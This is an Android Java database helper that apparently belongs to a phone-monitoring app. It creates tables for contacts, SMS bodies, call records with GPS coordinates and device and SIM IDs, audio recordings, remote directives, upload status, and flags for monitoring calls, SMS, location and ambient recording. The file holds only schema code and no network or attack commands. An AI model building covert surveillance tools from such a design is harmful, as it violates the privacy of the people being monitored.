package com.privacy.system.db;

import com.privacy.system.domain.CallRecord;
import com.privacy.system.domain.Contacts;
import com.privacy.system.domain.Directive;
import com.privacy.system.domain.LocationMessage;
import com.privacy.system.domain.Monitor;
import com.privacy.system.domain.Regular;
import com.privacy.system.domain.SMSRecord;
import com.privacy.system.domain.SoundFileInfo;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteDatabase.CursorFactory;
import android.database.sqlite.SQLiteOpenHelper;

/**
 * 初始化数据库表
 */
public class MySQLiteOpenHelper extends SQLiteOpenHelper {

	public MySQLiteOpenHelper(Context context, String name,CursorFactory factory, int version) {
		super(context, name, factory, version);
	}

	@Override
	public void onCreate(SQLiteDatabase db) {
		
		//通信录表
		db.execSQL("CREATE TABLE IF NOT EXISTS " + ContactsDB.TABLE_NAME + " ( "+
		Contacts.COL_ID+" INTEGER PRIMARY KEY AUTOINCREMENT , " +
		Contacts.COL_NAME+" varchar(10) ," + Contacts.COL_PHONE +" varchar(30) );");
		
		//录音文件信息
		db.execSQL("CREATE TABLE IF NOT EXISTS "+ FileDB.TABLE_NAME + " ( "+ 
		SoundFileInfo.COL_FILE_ID+" INTEGER PRIMARY KEY AUTOINCREMENT , " +
		SoundFileInfo.COL_FILE_NAME +" TEXT , " + SoundFileInfo.COL_FILE_PATH +" TEXT ," +
		SoundFileInfo.COL_FILE_SIZE +" TEXT , " + SoundFileInfo.COL_FILE_START_TIME +" TEXT ,"+
		SoundFileInfo.COL_FILE_END_TIME +" TEXT );");
		
		//指令表
		db.execSQL("CREATE TABLE IF NOT EXISTS "+DirectiveDB.TABLE_NAME+" (" +
		Directive.COL_DID + " INTEGER PRIMARY KEY AUTOINCREMENT," +
		Directive.COL_TYPE +" varchar(10) , " + Directive.COL_STATUS + " TEXT , " +
		Directive.COL_HEAD +" TEXT , "+ Directive.COL_START_TIME +" TEXT," +
		Directive.COL_DI_PLATFORM +" varchar(5) );");
		
		//监控列表
		db.execSQL("CREATE TABLE IF NOT EXISTS " + MonitorDB.TABLE_NAME +" (" +
		Monitor.COL_ID +" INTEGER PRIMARY KEY AUTOINCREMENT ," +
		Monitor.COL_CALL_MONITOR_STATUS +" varchar(5), " + Monitor.COL_FILTER_STATUS +" varchar(5) ," +Monitor.COL_SMS_MONITOR_STATUS +" varchar(5), " +
		Monitor.COL_LOCATIONSTATUS +" varchar(5) ,  " + Monitor.COL_PHONE +" TEXT , "+ Monitor.COL_ENV_REC_MONITOR_STATUS  +" varchar(5) ) ;");
	
		//信息表
		db.execSQL("CREATE TABLE IF NOT EXISTS "+SMSRecordDB.TABLE_NAME+ " (" +
		SMSRecord.COL_ID +" INTEGER PRIMARY KEY AUTOINCREMENT," +
		SMSRecord.COL_PHONE +" TEXT, "+SMSRecord.COL_BODY+" TEXT,"+ SMSRecord.COL_NAME +" varchar(10) ,"+
		SMSRecord.COL_DATE +" TEXT,"+SMSRecord.COL_READ_STATUS +" varchar(5) ," + 
		SMSRecord.COL_SMS_TYPE +" varchar(5) ," +SMSRecord.COL_SENT_STATUS +" varchar(5),"+
		SMSRecord.COL_UPLOAD_STATUS +" varchar(5) ) ;");
		
		//通话记录
		db.execSQL("CREATE TABLE IF NOT EXISTS " + CallRecordDB.TABLE_NAME +" (" +
		CallRecord.COL_ID +" INTEGER PRIMARY KEY AUTOINCREMENT ," +CallRecord.COL_MY_PHONE +" TEXT," +
		CallRecord.COL_PHONE + " TEXT," + CallRecord.COL_CALL_STATUS +" varchar(5) ,"+
		CallRecord.COL_CALL_START_TIME +" TEXT," +CallRecord.COL_CALL_STOP_TIME +" TEXT," +
		CallRecord.COL_LAT +" TEXT,"+CallRecord.COL_LON +" TEXT," + 
		CallRecord.COL_DEVICE_NAME +" TEXT,"+CallRecord.COL_FILE_NAME +" TEXT,"  +CallRecord.COL_DEVICE_ID +" TEXT," + 
		CallRecord.COL_UPLOAD_RESULT +" varchar(10),"+CallRecord.COL_SOUND_RECORD_FILE_PATH +" TEXT," +
		CallRecord.COL_NAME +" varchar(10) , "+ CallRecord.COL_SIM_ID+" TEXT ); ");
		
		//定时任务
		db.execSQL("CREATE TABLE IF NOT EXISTS " + RegularDB.TABLE_NAME + "( " +
		Regular.COL_ID + " INTEGER PRIMARY KEY AUTOINCREMENT , " + Regular.COL_REG_START +" TEXT, " +
		Regular.COL_REG_LONG+" TEXT , " + Regular.COL_TYPE +" varchar(5) );");
		
		//定位信息
		db.execSQL("CREATE TABLE IF NOT EXISTS " + LocManDB.TABLE_NAME+" ( "+
		LocationMessage.COL_ID +" INTEGER PRIMARY KEY AUTOINCREMENT , "+ LocationMessage.COL_LATITUDE +" TEXT , " +
		LocationMessage.COL_LONGITUDE +" TEXT , " + LocationMessage.COL_LOC_TIME+" TEXT ,"+
		LocationMessage.COL_STATUS+" varchar(5) );");
		
	}

	@Override
	public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
		
	}
}
